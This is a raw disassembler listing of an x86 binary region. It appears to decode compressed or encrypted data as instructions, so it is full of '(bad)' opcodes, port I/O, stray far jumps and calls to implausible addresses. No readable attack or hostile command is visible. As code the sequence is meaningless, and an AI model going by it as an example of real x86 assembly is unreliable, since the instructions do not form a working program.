  41f1f8:	aam    0xb0
  41f1fa:	push   ss
  41f1fb:	jns    0x41f1ee
  41f1fd:	adc    cl,BYTE PTR [ebp-0x39]
  41f200:	test   BYTE PTR [ebp+0x4dd13ef0],0x99
  41f207:	mov    esp,0x4a1bcf78
  41f20c:	daa    
  41f20d:	sbb    DWORD PTR [edx+0xf],esi
  41f210:	test   ch,dl
  41f212:	out    dx,al
  41f213:	mov    al,ds:0xfc0fcc8b
  41f218:	dec    ebp
  41f219:	push   es
  41f21a:	pop    es
  41f21b:	dec    esp
  41f21c:	or     BYTE PTR [ebx+0x4e],0x9a
  41f220:	fwait
  41f221:	push   es
  41f222:	add    ecx,DWORD PTR [ebx-0x7d]
  41f225:	jmp    0x4177:0xb755
  41f22b:	mov    ebx,0x20e41e8d
  41f230:	fisubr DWORD PTR [esi+0x794cf5dd]
  41f236:	ficomp DWORD PTR [eax+0x205d416a]
  41f23c:	retf   
  41f23d:	popf   
  41f23e:	je     0x41f254
  41f240:	mov    ah,0xc1
  41f242:	dec    edi
  41f243:	icebp  
  41f244:	shr    cl,1
  41f246:	mov    cl,0x5c
  41f248:	mov    ds:0x2aadf86d,al
  41f24d:	addr16 adc eax,0xfb616c74
  41f253:	(bad)  
  41f254:	push   ds
  41f255:	je     0x41f271
  41f257:	shr    DWORD PTR [ebx],1
  41f259:	sub    BYTE PTR [edx+0x7d0eafd0],cl
  41f25f:	int3   
  41f260:	les    ebp,FWORD PTR [esi+ebx*1+0xd5ca09b]
  41f267:	push   edx
  41f268:	sub    esp,esi
  41f26a:	into   
  41f26b:	retf   
  41f26c:	in     eax,dx
  41f26d:	adc    al,0x3a
  41f26f:	xchg   esp,eax
  41f270:	xor    al,0x99
  41f272:	ds inc ecx
  41f274:	rol    BYTE PTR [esi],1
  41f276:	pop    edi
  41f277:	dec    ebx
  41f278:	fldenv [esp+ebp*4+0x7f]
  41f27c:	mov    dl,0x4c
  41f27e:	add    edi,DWORD PTR [edi+0x3b]
  41f281:	fld    TBYTE PTR [ebx-0x3b]
  41f284:	sbb    DWORD PTR [eax-0x77],edi
  41f287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f288:	mov    WORD PTR [edx+0x51],ss
  41f28b:	repnz test DWORD PTR [eax],ebx
  41f28e:	jns    0x41f250
	...
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f34f
  41f301:	call   0x4bfea202
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    al,0x1
  41f30a:	add    BYTE PTR [eax],al
  41f30c:	sub    BYTE PTR [edi],ch
  41f30e:	pop    ebx
  41f30f:	aad    0xee
  41f311:	leave  
  41f312:	std    
  41f313:	repnz scas al,BYTE PTR es:[edi]
  41f315:	adc    cl,0x14
  41f318:	popa   
  41f319:	xor    DWORD PTR [ecx],edi
  41f31b:	push   esp
  41f31c:	xchg   DWORD PTR [ecx],esp
  41f31e:	jo     0x41f34f
  41f320:	xor    ah,bh
  41f322:	mov    ebp,0xe8b10cf7
  41f327:	and    DWORD PTR [edi+0x3a00ed48],ebp
  41f32d:	repnz in eax,0xfa
  41f330:	dec    esi
  41f331:	xchg   esi,eax
  41f332:	loopne 0x41f2eb
  41f334:	jno    0x41f3b5
  41f336:	add    BYTE PTR [ecx],dl
  41f338:	into   
  41f339:	aaa    
  41f33a:	(bad)  
  41f33b:	cli    
  41f33c:	adc    eax,esp
  41f33e:	xchg   BYTE PTR [eax-0x17],ah
  41f341:	fimul  WORD PTR [edx]
  41f343:	mov    WORD PTR [esi+0x1e527d87],cs
  41f349:	mov    al,0x27
  41f34b:	xor    esi,eax
  41f34d:	jae    0x41f304
  41f34f:	mov    ds:0x221582f4,al
  41f354:	daa    
  41f355:	int3   
  41f356:	xlat   BYTE PTR ds:[ebx]
  41f357:	sub    eax,0x9ee57ded
  41f35c:	pop    ebp
  41f35d:	or     edi,0xffffffde
  41f360:	fs icebp 
  41f362:	shl    BYTE PTR [edi+ebx*4-0x678b932f],0xf0
  41f36a:	in     al,0x9f
  41f36c:	mov    ebx,0xe242f507
  41f371:	mov    al,0x68
  41f373:	std    
  41f374:	retf   0x17d9
  41f377:	adc    dl,BYTE PTR [edi+ebx*2-0x6a]
  41f37b:	jl     0x41f360
  41f37d:	iret   
  41f37e:	call   0x40a8dbc7
  41f383:	jae    0x41f37b
  41f385:	pop    esi
  41f386:	loopne 0x41f385
  41f388:	aaa    
  41f389:	xchg   DWORD PTR [ebp-0x72727bc3],esi
  41f38f:	pop    esp
  41f390:	pop    DWORD PTR [edx+eax*4+0x64ac2b36]
  41f397:	adc    DWORD PTR [esi-0x1b37158f],edi
  41f39d:	shl    BYTE PTR [ebx+0x5b],0xc7
  41f3a1:	lea    ebx,[ebx-0x7f9d92f2]
  41f3a7:	aas    
  41f3a8:	loop   0x41f39c
  41f3aa:	cmc    
  41f3ab:	repz arpl WORD PTR [edi+edx*4],cx
  41f3af:	cs call 0xb7cb3280
  41f3b5:	lock adc al,0x23
  41f3b8:	lds    edi,FWORD PTR [edi]
  41f3ba:	pop    ds
  41f3bb:	and    esp,DWORD PTR [eax]
  41f3bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3be:	and    dl,al
  41f3c0:	aas    
  41f3c1:	sti    
  41f3c2:	mov    bl,0x15
  41f3c4:	xchg   BYTE PTR [ebp-0x5d591b3a],al
  41f3ca:	or     al,0x53
  41f3cc:	jmp    0xdef4:0x9e8f6e4d
  41f3d3:	mov    BYTE PTR [esi+ecx*4+0x9],bl
  41f3d7:	xchg   edi,eax
  41f3d8:	push   0xffffffb7
  41f3da:	sets   BYTE PTR [eax+eiz*8-0x1c]
  41f3df:	shl    DWORD PTR [edx],1
  41f3e1:	fcom   QWORD PTR [eax+ebx*1-0x7aaf8164]
  41f3e8:	adc    cl,BYTE PTR [edx+0x344c169c]
  41f3ee:	sub    al,0x6e
  41f3f0:	mov    ds:0xbabd6035,eax
  41f3f5:	repnz push ds
  41f3f7:	mov    bl,0xc2
  41f3f9:	scas   al,BYTE PTR es:[edi]
  41f3fa:	inc    eax
  41f3fb:	shl    BYTE PTR [esi+0x12b5035f],0xbd
  41f402:	jge    0x41f3fc
  41f404:	push   0x6e959c1c
  41f409:	push   ebx
  41f40a:	(bad)  
  41f40b:	push   eax
  41f40c:	push   esp
  41f40d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f40e:	cmp    DWORD PTR [eax],0x0
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x99
  41f481:	ret    
  41f482:	imul   ebp,DWORD PTR [eax-0x40],0x4c
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    al,0x1
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	mov    BYTE PTR [esp+ecx*8+0x23],cl
  41f490:	and    edi,DWORD PTR [ecx-0x14]
  41f493:	scas   eax,DWORD PTR es:[edi]
  41f494:	daa    
  41f495:	stos   DWORD PTR es:[edi],eax
  41f496:	mov    esi,0x503d61f0
  41f49b:	stos   BYTE PTR es:[edi],al
  41f49c:	call   0x147fd3ef
  41f4a1:	cmp    ebp,DWORD PTR [ecx]
  41f4a3:	jo     0x41f437
  41f4a5:	mov    bh,0x37
  41f4a7:	jge    0x41f44c
  41f4a9:	mov    ah,0x32
  41f4ab:	or     BYTE PTR [ebx],dh
  41f4ad:	and    ecx,DWORD PTR [ebx+0x45d442d6]
  41f4b3:	popa   
  41f4b4:	sar    BYTE PTR [ebp+0x2f8f783e],0x53
  41f4bb:	int    0x79
  41f4bd:	or     eax,DWORD PTR [eax]
  41f4bf:	mov    dh,0x41
  41f4c1:	xor    DWORD PTR [ecx],0x43
  41f4c4:	inc    esi
  41f4c5:	test   al,0x5b
  41f4c7:	add    eax,0xa93959ff
  41f4cc:	cmp    al,0x7d
  41f4ce:	dec    edi
  41f4cf:	sub    ebx,DWORD PTR [edi+0x7cdd5b72]
  41f4d5:	cdq    
  41f4d6:	pop    ds
  41f4d7:	daa    
  41f4d8:	inc    eax
  41f4d9:	add    al,0x16
  41f4db:	lock dec edx
  41f4dd:	je     0x41f4e7
  41f4df:	pop    esp
  41f4e0:	pop    esp
  41f4e1:	sbb    BYTE PTR [ecx-0x2a],ah
  41f4e4:	or     bl,al
  41f4e6:	pushf  
  41f4e7:	sub    ah,BYTE PTR [ebx]
  41f4e9:	fisubr DWORD PTR [eax+0x28]
  41f4ec:	inc    edi
  41f4ed:	sub    al,0xe
  41f4ef:	jo     0x41f49f
  41f4f1:	(bad)  
  41f4f3:	push   ebp
  41f4f4:	aam    0x44
  41f4f6:	mov    eax,0x272fca28
  41f4fb:	adc    eax,0xd00f15d2
  41f500:	stos   BYTE PTR es:[edi],al
  41f501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f502:	shr    BYTE PTR [edi-0x5db7940f],cl
  41f508:	fbstp  TBYTE PTR [ebx-0x3a]
  41f50b:	push   0x81a03d13
  41f510:	imul   edx,DWORD PTR [eax+0x2e3ee300],0x61
  41f517:	dec    ebx
  41f518:	out    0x72,eax
  41f51a:	and    esp,edx
  41f51c:	pop    es
  41f51d:	inc    edi
  41f51e:	inc    eax
  41f51f:	das    
  41f520:	sub    al,0x90
  41f522:	push   esp
  41f523:	lea    eax,[esi]
  41f525:	pop    ds
  41f526:	adc    ecx,ebx
  41f528:	mov    bh,0x60
  41f52a:	bound  edi,QWORD PTR [esi-0x3b]
  41f52d:	loopne 0x41f517
  41f52f:	rcl    DWORD PTR [esi+edx*1-0x32],1
  41f533:	mov    dh,0xcc
  41f535:	pop    ds
  41f536:	push   cs
  41f537:	data16 mov ds:0x537caf1b,al
  41f53d:	adc    dl,BYTE PTR [esi]
  41f53f:	iret   
  41f540:	mov    cl,0xb6
  41f542:	jle    0x41f593
  41f544:	mov    ch,0xe7
  41f546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f547:	out    0x2d,al
  41f549:	es stos DWORD PTR es:[edi],eax
  41f54b:	mov    BYTE PTR [esi+0x62],dh
  41f54e:	and    BYTE PTR [ecx+0x5c6a1de0],ah
  41f554:	into   
  41f555:	push   ebp
  41f556:	test   al,0x3
  41f558:	outs   dx,BYTE PTR ss:[esi]
  41f55a:	mov    eax,0x3dc6455a
  41f55f:	pusha  
  41f560:	xor    BYTE PTR [ebx+0x5b],ch
  41f563:	clc    
  41f564:	push   0xffffffb0
  41f566:	je     0x41f4e9
  41f568:	cli    
  41f569:	mov    cl,0x8b
  41f56b:	out    dx,eax
  41f56c:	inc    esi
  41f56d:	test   al,0xa3
  41f56f:	dec    ebp
  41f570:	cmp    al,0xa1
  41f572:	or     ebx,DWORD PTR [esi]
  41f574:	sar    DWORD PTR [edi+0x7b],cl
  41f577:	sub    eax,0x5384861
  41f57c:	jp     0x41f5b1
  41f57e:	nop
  41f57f:	fwait
  41f580:	jnp    0x41f5a6
  41f582:	xor    ch,BYTE PTR [edx]
  41f584:	popa   
  41f585:	push   cs
  41f586:	push   ds
  41f587:	imul   edx,esi,0xffffffaf
  41f58a:	mov    bl,0x13
  41f58c:	test   DWORD PTR [esi],esi
  41f58e:	sub    BYTE PTR [ecx+0x0],0x0
	...
  41f5f1:	add    BYTE PTR [eax],al
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x826c:0xc5e0d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	adc    ch,BYTE PTR [esi]
  41f60e:	pop    edi
  41f60f:	push   es
  41f610:	mov    ecx,0x26650db
  41f615:	jmp    0x59b1:0x519893cc
  41f61c:	xor    bl,dl
  41f61e:	lahf   
  41f61f:	mov    ecx,0x15262b1a
  41f624:	mov    edi,0xea0b76af
  41f629:	push   edi
  41f62a:	or     bh,BYTE PTR [ebp+0x15c1e537]
  41f630:	inc    ecx
  41f631:	cmp    DWORD PTR [eax],ebp
  41f633:	xchg   ebp,eax
  41f634:	inc    esi
  41f635:	(bad)
  41f638:	into   
  41f639:	mov    ah,0xfb
  41f63b:	cli    
  41f63c:	mov    ch,0xbc
  41f63e:	fstp   QWORD PTR [ebx-0x10]
  41f641:	mov    al,ds:0xc9d73516
  41f646:	cmp    eax,0x3868c239
  41f64b:	(bad)
  41f64e:	adc    eax,0x653f67a1
  41f653:	pusha  
  41f654:	push   ebp
  41f655:	cmp    DWORD PTR [esi+0x3ff93159],edx
  41f65b:	bswap  edx
  41f65d:	or     edx,DWORD PTR [edi+0x44]
  41f660:	push   edi
  41f661:	xchg   edi,eax
  41f662:	pop    ebp
  41f663:	shl    ah,cl
  41f665:	push   esi
  41f666:	imul   eax,edi,0xfffffff8
  41f669:	leave  
  41f66a:	or     eax,0x3dc34276
  41f66f:	(bad)  
  41f671:	xchg   DWORD PTR [ecx+0x13],esp
  41f674:	imul   ecx,DWORD PTR [ecx],0xd6b85562
  41f67a:	lds    eax,FWORD PTR [ebx]
  41f67c:	loopne 0x41f6bc
  41f67e:	aam    0x92
  41f680:	inc    ebp
  41f681:	cmp    ah,BYTE PTR [edx]
  41f683:	mov    ds:0x2ffc04e3,al
  41f688:	xchg   ebp,eax
  41f689:	xor    DWORD PTR [ebp+0x3f5abe4c],0x0
  41f690:	jl     0x41f673
  41f692:	dec    edx
  41f693:	push   di
  41f695:	add    dh,ch
  41f697:	push   ds
  41f698:	dec    eax
  41f699:	aaa    
  41f69a:	dec    ebx
  41f69b:	sbb    eax,0x1ee13db2
  41f6a0:	out    dx,eax
  41f6a1:	pop    esi
  41f6a2:	sbb    BYTE PTR [ebx+esi*2],dh
  41f6a5:	push   esi
  41f6a6:	jns    0x41f696
  41f6a8:	fwait
  41f6a9:	shl    DWORD PTR [eax],cl
  41f6ab:	xchg   edx,edx
  41f6ad:	(bad)  
  41f6ae:	sti    
  41f6af:	jle    0x41f684
  41f6b1:	(bad)  
  41f6b2:	ins    DWORD PTR es:[edi],dx
  41f6b3:	push   ebp
  41f6b4:	jbe    0x41f666
  41f6b6:	and    al,0x9c
  41f6b8:	bound  ebx,QWORD PTR [ebx+0xf]
  41f6bb:	push   0x3e96923
  41f6c0:	imul   ebx,DWORD PTR [ebp-0x66],0xf18b8cc
  41f6c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6c8:	mov    ds:0x5b4a461c,eax
  41f6cd:	arpl   WORD PTR [esi],cx
  41f6cf:	jnp    0x41f6e1
  41f6d1:	or     eax,0xc30b8565
  41f6d6:	outs   dx,DWORD PTR ds:[esi]
  41f6d7:	into   
  41f6d8:	nop
  41f6d9:	stc    
  41f6da:	not    BYTE PTR [esi]
  41f6dc:	push   es
  41f6dd:	repz shr BYTE PTR [eax+0x6c2f38b8],cl
  41f6e4:	sbb    BYTE PTR [edi+ebx*8+0x23],bl
  41f6e8:	gs push cs
  41f6ea:	mov    esi,0x533393d5
  41f6ef:	fimul  WORD PTR [esp+edi*2-0x74a05eaf]
  41f6f6:	retf   0xd1
  41f6f9:	mov    esi,0x70f2831b
  41f6fe:	ds adc eax,0xd1671b83
  41f704:	mov    edi,0x411c26a4
  41f709:	push   ds
  41f70a:	into   
  41f70b:	jno    0x41f6cf
  41f70d:	mov    eax,ds:0xec5a
	...
  41f772:	add    BYTE PTR [eax],al
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xb00d:0x486c62d2
  41f783:	xchg   edx,eax
  41f784:	enter  0x14e,0x0
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	call   0x7492a6ad
  41f791:	adc    al,BYTE PTR [esi-0xc]
  41f794:	scas   eax,DWORD PTR es:[edi]
  41f795:	inc    edx
  41f796:	xor    BYTE PTR [eax-0x5d],ch
  41f799:	enter  0x954a,0xdf
  41f79d:	rol    BYTE PTR [ebp+0x37b58682],cl
  41f7a3:	es jmp 0x53b389c4
  41f7a9:	out    dx,eax
  41f7aa:	ins    DWORD PTR es:[edi],dx
  41f7ab:	hlt    
  41f7ac:	stc    
  41f7ad:	ror    BYTE PTR [ebx+0x65],0x3c
  41f7b1:	iret   
  41f7b2:	cmp    al,0xdc
  41f7b4:	cdq    
  41f7b5:	cli    
  41f7b6:	and    eax,0x94bb64d0
  41f7bb:	out    0xb4,eax
  41f7bd:	je     0x41f7fa
  41f7bf:	jp     0x41f78e
  41f7c1:	jp     0x41f78e
  41f7c3:	lahf   
  41f7c4:	cdq    
  41f7c5:	imul   edi,DWORD PTR [edi],0xffffff88
  41f7c8:	push   es
  41f7c9:	data16 cmp BYTE PTR [ebx],dl
  41f7cc:	mov    dl,0x4c
  41f7ce:	mov    edx,0xd88cff4b
  41f7d3:	ret    0x9976
  41f7d6:	mov    WORD PTR [eax+0x61],?
  41f7d9:	call   0x352a:0x1e792d5c
  41f7e0:	jge    0x41f7e5
  41f7e2:	xchg   DWORD PTR [esi],eax
  41f7e4:	xor    DWORD PTR [edx-0x64],eax
  41f7e7:	in     eax,0x92
  41f7e9:	inc    eax
  41f7ea:	mov    eax,ds:0xe11dee08
  41f7ef:	ss int 0xd5
  41f7f2:	adc    BYTE PTR [ecx-0x80],0x36
  41f7f6:	ficom  DWORD PTR [edi-0xb4da142]
  41f7fc:	push   0x3aaabfa2
  41f801:	call   0xa4d12362
  41f806:	cdq    
  41f807:	pop    ecx
  41f808:	or     edx,0x33
  41f80b:	mov    dh,0xa0
  41f80d:	rcr    BYTE PTR [esi],1
  41f80f:	pop    ss
  41f810:	mov    bl,BYTE PTR [eax]
  41f812:	(bad)  
  41f813:	pop    ss
  41f814:	jge    0x41f877
  41f816:	in     al,0x37
  41f818:	mov    WORD PTR [esi],fs
  41f81a:	or     DWORD PTR [eax-0x756a419a],0x90dabac0
  41f824:	addr16 jmp 0x652a1fae
  41f82a:	sti    
  41f82b:	je     0x41f82e
  41f82d:	xor    bl,BYTE PTR [ebx-0x2d14f612]
  41f833:	dec    ecx
  41f834:	sub    eax,0x4d837131
  41f839:	sbb    eax,0x93c5a869
  41f83e:	cmc    
  41f83f:	xchg   DWORD PTR [ecx+eax*1-0x3c],edx
  41f843:	and    BYTE PTR [ebx+0x45a9fb50],0x6e
  41f84a:	jns    0x41f8a4
  41f84c:	sub    bl,dh
  41f84e:	nop
  41f84f:	jmp    0x69fa9cb2
  41f854:	nop
  41f855:	fldenv [ebx]
  41f857:	repnz fcmovb st,st(7)
  41f85a:	xchg   ecx,eax
  41f85b:	mov    esi,0xd616bce3
  41f860:	jbe    0x41f822
  41f862:	cli    
  41f863:	imul   edi,DWORD PTR [edx+0x2dba483c],0x6c
  41f86a:	popf   
  41f86b:	jmp    0x221670a0
  41f870:	pop    ss
  41f871:	xchg   edi,ecx
  41f873:	fnstsw WORD PTR [edx]
  41f875:	lock inc ebp
  41f877:	adc    al,0x65
  41f879:	dec    ecx
  41f87a:	push   eax
  41f87b:	mov    edi,edi
  41f87d:	jo     0x41f892
  41f87f:	pusha  
  41f880:	rcr    DWORD PTR [esp+ebp*2+0x2a],1
  41f884:	rcl    BYTE PTR [edi-0x20921f73],cl
  41f88a:	pop    ds
  41f88b:	cmp    bh,BYTE PTR [ecx+0x3c]
  41f88e:	sub    dl,0x0
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	loop   0x41f8e0
  41f902:	and    al,0x19
  41f904:	int3   
  41f905:	dec    edi
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f90d:	mov    esp,0x9d4ffeff
  41f912:	jae    0x41f8f1
  41f914:	into   
  41f915:	mov    WORD PTR [edx],?
  41f917:	das    
  41f918:	jae    0x41f8d3
  41f91a:	cmp    eax,0x84cc7e36
  41f91f:	ret    0xcae7
  41f922:	and    BYTE PTR [eax-0x7],al
  41f925:	inc    esi
  41f926:	xchg   DWORD PTR ds:0xc9e089f0,eax
  41f92c:	jmp    0x3098:0x6e612a0c
  41f933:	cmp    DWORD PTR [ecx+eiz*8+0x9],edi
  41f937:	xchg   esi,eax
  41f938:	aas    
  41f939:	lods   eax,DWORD PTR ds:[esi]
  41f93a:	dec    ebx
  41f93b:	mov    dl,0x6d
  41f93d:	jo     0x41f958
  41f93f:	jno    0x41f93c
  41f941:	ins    DWORD PTR es:[edi],dx
  41f942:	scas   al,BYTE PTR es:[edi]
  41f943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f944:	push   eax
  41f945:	push   esi
  41f946:	mov    bl,0xca
  41f948:	call   0x2c5a:0xa5d6d08f
  41f94f:	push   0xffffffbe
  41f951:	xchg   ebp,eax
  41f952:	mov    ebx,0x7b7527f7
  41f957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f958:	jge    0x41f940
  41f95a:	or     ch,BYTE PTR [edx+ebp*1+0x4bc9884b]
  41f961:	dec    edx
  41f962:	outs   dx,DWORD PTR ds:[esi]
  41f963:	xor    al,0x2
  41f965:	jo     0x41f8fd
  41f967:	push   ss
  41f968:	es pop edi
  41f96a:	mov    eax,ds:0x61878763
  41f96f:	fnstcw WORD PTR [eax]
  41f971:	test   eax,0xb558f894
  41f976:	cmp    BYTE PTR [edi+0x5d05571b],bl
  41f97c:	leave  
  41f97d:	cmp    eax,0x8acb7f8
  41f982:	mov    esp,0xef9741cb
  41f987:	das    
  41f988:	dec    esi
  41f989:	pusha  
  41f98a:	and    BYTE PTR [ebp-0x4c003a9b],dl
  41f990:	ret    
  41f991:	and    al,0xbb
  41f993:	adc    al,0xf2
  41f995:	push   ecx
  41f996:	mov    ds:0xce446718,al
  41f99b:	push   es
  41f99c:	std    
  41f99d:	hlt    
  41f99e:	push   ecx
  41f99f:	sbb    eax,0xd5afbafb
  41f9a4:	or     DWORD PTR [ebx+0x3ce2f7b1],0x7f
  41f9ab:	sub    BYTE PTR [esi-0x2e046a2c],0xf2
  41f9b2:	add    bh,dh
  41f9b4:	push   esp
  41f9b5:	inc    esp
  41f9b6:	xchg   ah,dl
  41f9b8:	loop   0x41f93f
  41f9ba:	test   al,0x85
  41f9bc:	cs cwde 
  41f9be:	xor    edx,DWORD PTR ds:0x81d9baf4
  41f9c4:	inc    ebx
  41f9c5:	test   al,0x17
  41f9c7:	in     eax,0xdc
  41f9c9:	adc    BYTE PTR [ebx-0x7da3a950],0x6c
  41f9d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9d1:	ss ds xchg ebx,eax
  41f9d4:	jns    0x41fa33
  41f9d6:	cmp    DWORD PTR [ecx+0x1a],esp
  41f9d9:	into   
  41f9da:	cmp    al,0xaf
  41f9dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9dd:	push   esi
  41f9de:	aam    0x31
  41f9e0:	sti    
  41f9e1:	test   eax,0x15c47045
  41f9e6:	add    BYTE PTR [ebx],ah
  41f9e8:	cmp    al,0xa1
  41f9ea:	sbb    BYTE PTR [edi+0xb2496b5],ch
  41f9f0:	cmp    DWORD PTR [ebp-0x7d],ebx
  41f9f3:	cwde   
  41f9f4:	les    esi,FWORD PTR [ebx+0x3e]
  41f9f7:	push   esi
  41f9f8:	adc    eax,0xe0d8038e
  41f9fd:	dec    edx
  41f9fe:	addr16 loopne 0x41fa08
  41fa01:	pop    es
  41fa02:	js     0x41fa68
  41fa04:	mov    ds:0x22f132c8,eax
  41fa09:	push   ecx
  41fa0a:	pop    eax
  41fa0b:	mov    gs,WORD PTR [edx+0xe6501b]
	...
  41fa71:	add    BYTE PTR [eax],al
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0xc2de0015,eax
  41fa83:	ret    0x50d0
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    al,0x1
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	fwait
  41fa8d:	sub    dl,BYTE PTR [eax]
  41fa8f:	xchg   esi,eax
  41fa90:	sahf   
  41fa91:	mov    edx,ecx
  41fa93:	lds    eax,FWORD PTR [bx+di+0xd]
  41fa97:	jne    0x41faf9
  41fa99:	xchg   DWORD PTR [edi+0xb],esp
  41fa9c:	ret    
  41fa9d:	jmp    DWORD PTR [esi-0x6a]
  41faa0:	xor    eax,0xa496c894
  41faa5:	pop    ecx
  41faa6:	call   0xe8fd49c7
  41faab:	in     al,dx
  41faac:	cmp    ebx,eax
  41faae:	outs   dx,DWORD PTR ds:[esi]
  41faaf:	cmp    ch,BYTE PTR [ecx+0x1]
  41fab2:	or     DWORD PTR [ebx+0x5fe02fe4],0x58
  41fab9:	push   ecx
  41faba:	cdq    
  41fabb:	sub    eax,DWORD PTR [edx]
  41fabd:	aas    
  41fabe:	loopne 0x41fad8
  41fac0:	addr16 push esp
  41fac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fac3:	iret   
  41fac4:	std    
  41fac5:	popf   
  41fac6:	scas   eax,DWORD PTR es:[edi]
  41fac7:	neg    BYTE PTR [ebx-0x392c34f8]
  41facd:	sub    ebx,DWORD PTR [ebp+esi*2+0x7e959b2]
  41fad4:	cld    
  41fad5:	stos   BYTE PTR es:[edi],al
  41fad6:	mov    DWORD PTR [ebx+eiz*1],ebp
  41fad9:	in     al,dx
  41fada:	into   
  41fadb:	stc    
  41fadc:	sub    edx,esi
  41fade:	fwait
  41fadf:	and    esp,eax
  41fae1:	push   ss
  41fae2:	pop    esp
  41fae3:	or     DWORD PTR [esi+0x7eaa1eec],ebp
  41fae9:	rcl    BYTE PTR [eax],cl
  41faeb:	test   DWORD PTR [eax-0x45],esp
  41faee:	inc    edx
  41faef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faf0:	and    eax,0xf8d37e26
  41faf5:	or     BYTE PTR [esi+0xf],bh
  41faf8:	test   al,0xd7
  41fafa:	push   esp
  41fafb:	dec    edx
  41fafc:	sub    edx,edx
  41fafe:	dec    edx
  41faff:	fwait
  41fb00:	pop    edi
  41fb01:	scas   eax,DWORD PTR es:[edi]
  41fb02:	je     0x41fb83
  41fb04:	mov    bh,0xa0
  41fb06:	shl    DWORD PTR [ebx-0x10695570],1
  41fb0c:	and    edi,DWORD PTR [edx-0x3b]
  41fb0f:	cmc    
  41fb10:	retf   0x1007
  41fb13:	inc    edx
  41fb14:	inc    edi
  41fb15:	shl    BYTE PTR [ebx+0x4403c45e],0x4f
  41fb1c:	fcom   st(3)
  41fb1e:	and    edx,esi
  41fb20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb21:	pop    ecx
  41fb22:	adc    DWORD PTR [eax+0x9578c01],edi
  41fb28:	call   0x10ce815f
  41fb2d:	arpl   WORD PTR [edi+0x41],dx
  41fb30:	int3   
  41fb31:	push   0x680819f
  41fb36:	xchg   BYTE PTR [edx-0xd],ch
  41fb39:	imul   edx,ecx,0x6ec17105
  41fb3f:	popf   
  41fb40:	cmp    DWORD PTR [ebx+ecx*8],0x2ad6383a
  41fb47:	in     eax,0xd0
  41fb49:	arpl   WORD PTR [eax+0x243816e7],ax
  41fb4f:	int    0xd1
  41fb51:	mov    eax,0xd826d908
  41fb56:	mov    ?,WORD PTR [edi-0x79]
  41fb59:	sbb    ch,BYTE PTR [ebx]
  41fb5b:	iret   
  41fb5c:	mov    edi,0xd8aa89be
  41fb61:	aas    
  41fb62:	mov    dh,0x80
  41fb64:	fmul   QWORD PTR [edx+edx*8-0x73]
  41fb68:	or     al,0x90
  41fb6a:	test   DWORD PTR [ebx],edi
  41fb6c:	fwait
  41fb6d:	(bad)  
  41fb6e:	dec    ecx
  41fb6f:	mov    al,ds:0xb5d28a2f
  41fb74:	adc    dh,BYTE PTR [esi-0x4fbbeb85]
  41fb7a:	xchg   edx,eax
  41fb7b:	push   ebx
  41fb7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb7d:	jne    0x41fb89
  41fb7f:	ficom  WORD PTR [edx]
  41fb81:	and    eax,0xf1e9b8ce
  41fb86:	test   al,0xd3
  41fb88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb89:	ins    DWORD PTR es:[edi],dx
  41fb8a:	fldenv [edx]
  41fb8c:	dec    edi
  41fb8d:	and    al,0x23
  41fb8f:	rol    DWORD PTR [eax],0x0
	...
  41fbf2:	add    BYTE PTR [eax],al
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	dec    ebx
  41fc01:	add    DWORD PTR [ecx+0x151d4b6],ebx
  41fc07:	add    BYTE PTR [ecx+eax*1],al
